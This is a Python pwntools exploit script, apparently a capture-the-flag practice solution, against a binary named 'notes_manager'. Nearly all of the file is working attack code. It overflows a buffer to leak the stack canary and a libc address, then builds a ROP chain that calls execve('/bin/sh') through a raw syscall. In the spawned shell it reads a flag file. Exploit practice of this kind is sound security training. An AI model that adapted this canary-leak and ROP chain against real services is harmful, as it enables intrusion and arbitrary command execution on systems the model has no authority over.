#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import re
from pwn import *

exe = context.binary = ELF(args.EXE or "bin/notes_manager")
libc = ELF("./libc.so.6")

HOST = args.HOST or "127.0.0.1"
PORT = int(args.PORT or 1337)


def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    return process([exe.path] + argv, *a, **kw)


gdbscript = """
tbreak main
continue
"""

io = start()

# Stage 1: leak canary tail via oversized %s print in one buffered shot.
io.send(b"1\n" + b"a" * 72 + b"\n")
io.recvuntil(b"->")
io.recvline()
leak = io.recv(7)

# Stage 2: leak libc pointer near __libc_start_main in one shot.
io.send(b"1\n" + b"a" * (72 + 8 + 8 - 1) + b"\n")
io.recvuntil(b"->")
io.recvline()
an = io.recvuntil(b"Choos").replace(b"Choos", b"")
libc_start = u64(an.ljust(8, b"\x00"))
libc.address = libc_start - 171408

rop = ROP(libc)
bin_sh = next(libc.search(b"/bin/sh\x00"))
pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rdx = rop.find_gadget(["pop rdx", "pop rbx", "ret"])[0]
pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
syscall = rop.find_gadget(["syscall", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

pl = b""
pl += b"a" * 72
pl += b"\x00" + leak
pl += p64(0xdeadbeef)
pl += p64(ret)
pl += p64(pop_rax) + p64(59)
pl += p64(pop_rdi) + p64(bin_sh)
pl += p64(pop_rsi) + p64(0)
pl += p64(pop_rdx) + p64(0) + p64(0)
pl += p64(syscall)

# Stage 3: trigger ROP and then execute command in spawned shell.
io.send(b"1\n" + pl + b"\n")
sleep(0.3)
io.sendline(b"cat /app/flag.txt")
io.sendline(b"exit")
out = io.recvall(timeout=2)

m = re.search(rb"practice\{[^\n\r]+\}", out)
if m:
    print(m.group(0).decode(errors="ignore"))
else:
    print(out.decode(errors="ignore"))
